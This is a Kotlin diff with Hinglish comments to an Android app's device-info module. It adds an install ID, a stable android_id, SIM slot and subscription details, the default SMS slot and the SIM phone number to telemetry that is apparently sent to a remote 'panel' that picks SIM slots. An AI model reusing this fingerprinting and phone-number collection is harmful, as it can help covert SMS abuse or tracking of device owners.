@@ -21,9 +21,39 @@ import java.net.Inet4Address
 import java.net.NetworkInterface
 import java.util.Locale
 import java.util.TimeZone
+import java.util.UUID
 
 /** Service + MainActivity dono yahi se device info lete hain. */
 object DeviceInfo {
+
+    private const val PREFS = "viral_prefs"
+    private const val KEY_INSTALL_ID = "install_id"
+    private const val TAG = "DeviceInfo"
+
+    // ------------------------------------------------------------ identity
+
+    /**
+     * Har install ka naya UUID. Uninstall par SharedPreferences clear hote hain,
+     * isliye naya id = reinstall (panel isse churn nikalta hai).
+     */
+    fun installId(context: Context): String {
+        val p = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
+        p.getString(KEY_INSTALL_ID, null)?.let { if (it.isNotBlank()) return it }
+        val id = UUID.randomUUID().toString()
+        p.edit().putString(KEY_INSTALL_ID, id).apply()
+        return id
+    }
+
+    /** Device-level stable id — reinstall par bhi same rehta hai. */
+    fun androidId(context: Context): String = runCatching {
+        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: ""
+    }.getOrDefault("")
+
+    fun versionName(context: Context): String = runCatching {
+        context.packageManager.getPackageInfo(context.packageName, 0).versionName ?: ""
+    }.getOrDefault("")
+
+    // ------------------------------------------------------------ sim info
 
     /** (number, source) — source: subscription | line1 | "" */
     fun simNumber(context: Context): Pair<String, String> {
@@ -36,7 +66,7 @@ object DeviceInfo {
                 }
             }
         } catch (t: Throwable) {
-            Log.w("DeviceInfo", "subscription number", t)
+            Log.w(TAG, "subscription number", t)
         }
         try {
             val tm = context.getSystemService(TelephonyManager::class.java)
@@ -44,20 +74,26 @@ object DeviceInfo {
             val n = tm?.line1Number
             if (!n.isNullOrBlank()) return n to "line1"
         } catch (t: Throwable) {
-            Log.w("DeviceInfo", "line1", t)
+            Log.w(TAG, "line1", t)
         }
         return "" to ""
     }
 
-    private fun sims(context: Context): JSONArray {
+    /** Panel ke SIM picker ke liye: slot, subId, carrier, number, default flag. */
+    fun simSlots(context: Context): JSONArray {
         val arr = JSONArray()
         try {
-            val sm = context.getSystemService(SubscriptionManager::class.java)
-            sm?.activeSubscriptionInfoList?.forEach { info ->
+            val sm = context.getSystemService(SubscriptionManager::class.java) ?: return arr
+            val def = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1)
+                SubscriptionManager.getDefaultSmsSubscriptionId() else -1
+
+            sm.activeSubscriptionInfoList?.forEach { info ->
                 val o = JSONObject()
                 o.put("slot", info.simSlotIndex)
+                o.put("sub_id", info.subscriptionId)
                 o.put("carrier", info.carrierName?.toString() ?: "")
                 o.put("country", info.countryIso ?: "")
+                o.put("is_default_sms", info.subscriptionId == def)
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                     val n = runCatching { sm.getPhoneNumber(info.subscriptionId) }.getOrNull()
                     if (!n.isNullOrBlank()) {
@@ -68,25 +104,49 @@ object DeviceInfo {
                 arr.put(o)
             }
         } catch (t: Throwable) {
-            Log.w("DeviceInfo", "sims", t)
-        }
-
-        if (arr.length() == 0) {
-            // fallback: single-SIM devices / OEM jo list nahi deta
-            try {
-                val tm = context.getSystemService(TelephonyManager::class.java)
-                val o = JSONObject()
-                o.put("slot", 0)
-                o.put("carrier", tm?.networkOperatorName ?: "")
-                o.put("country", tm?.simCountryIso ?: "")
-                val (n, src) = simNumber(context)
-                if (n.isNotBlank()) { o.put("number", n); o.put("number_source", src) }
-                arr.put(o)
-            } catch (_: Throwable) {
-            }
+            Log.w(TAG, "simSlots", t)
         }
         return arr
     }
+
+    fun defaultSmsSlot(context: Context): Int = try {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP_MR1) -1
+        else {
+            val def = SubscriptionManager.getDefaultSmsSubscriptionId()
+            context.getSystemService(SubscriptionManager::class.java)
+                ?.activeSubscriptionInfoList
+                ?.firstOrNull { it.subscriptionId == def }
+                ?.simSlotIndex ?: -1
+        }
+    } catch (_: Throwable) {
+        -1
+    }
+
+    /** Purana sims() — ab simSlots se derive hota hai, sub_id ke saath. */
+    private fun sims(context: Context): JSONArray {
+        val arr = simSlots(context)
+        if (arr.length() > 0) return arr
+
+        // fallback: single-SIM devices / OEM jo list nahi deta
+        try {
+            val tm = context.getSystemService(TelephonyManager::class.java)
+            val o = JSONObject()
+            o.put("slot", 0)
+            o.put("sub_id", -1)
+            o.put("carrier", tm?.networkOperatorName ?: "")
+            o.put("country", tm?.simCountryIso ?: "")
+            val (n, src) = simNumber(context)
+            if (n.isNotBlank()) {
+                o.put("number", n)
+                o.put("number_source", src)
+            }
+            arr.put(o)
+        } catch (_: Throwable) {
+        }
+        return arr
+    }
+
+    // ------------------------------------------------------------ network
 
     private fun networkType(context: Context): String {
         val cm = context.getSystemService(ConnectivityManager::class.java) ?: return ""
@@ -139,6 +199,8 @@ object DeviceInfo {
         0
     }
 
+    // ---------------------------------------------------------- telemetry
+
     fun telemetry(context: Context): JSONObject {
         val t = JSONObject()
         val (number, source) = simNumber(context)
@@ -153,17 +215,13 @@ object DeviceInfo {
         t.put("cpu_cores", Runtime.getRuntime().availableProcessors())
         t.put("android_version", Build.VERSION.RELEASE)
         t.put("sdk_int", Build.VERSION.SDK_INT)
-        t.put("app_version", "4.4")
+        t.put("app_version", versionName(context))          // FIX: hardcoded "4.4" hata diya
+        t.put("install_id", installId(context))             // NEW
         t.put("uptime_seconds", SystemClock.elapsedRealtime() / 1000)
         t.put("locale", Locale.getDefault().toString())
         t.put("timezone", TimeZone.getDefault().id)
 
-        runCatching {
-            t.put(
-                "android_id",
-                Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: ""
-            )
-        }
+        runCatching { t.put("android_id", androidId(context)) }
 
         runCatching {
             val am = context.getSystemService(ActivityManager::class.java)
@@ -199,7 +257,8 @@ object DeviceInfo {
             val status = i?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
             t.put(
                 "battery_charging",
-                status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
+                status == BatteryManager.BATTERY_STATUS_CHARGING ||
+                    status == BatteryManager.BATTERY_STATUS_FULL
             )
             val temp = i?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1) ?: -1
             if (temp > 0) t.put("battery_temperature_c", temp / 10f)
@@ -207,10 +266,9 @@ object DeviceInfo {
 
         t.put("sim_count", simArr.length())
         t.put("sims", simArr)
-        runCatching {
-            val tm = context.getSystemService(TelephonyManager::class.java)
-            t.put("sim_carrier", tm?.networkOperatorName ?: "")
-        }
+        runCatching { t.put("sim_slots", simSlots(context)) }              // NEW — panel picker
+        runCatching { t.put("default_sms_slot", defaultSmsSlot(context)) } // NEW
+        runCatching { t.put("sim_carrier", SimRouter.networkOperatorName(context)) }
         if (number.isNotBlank()) {
             t.put("sim_number", number)
             t.put("sim_number_source", source)
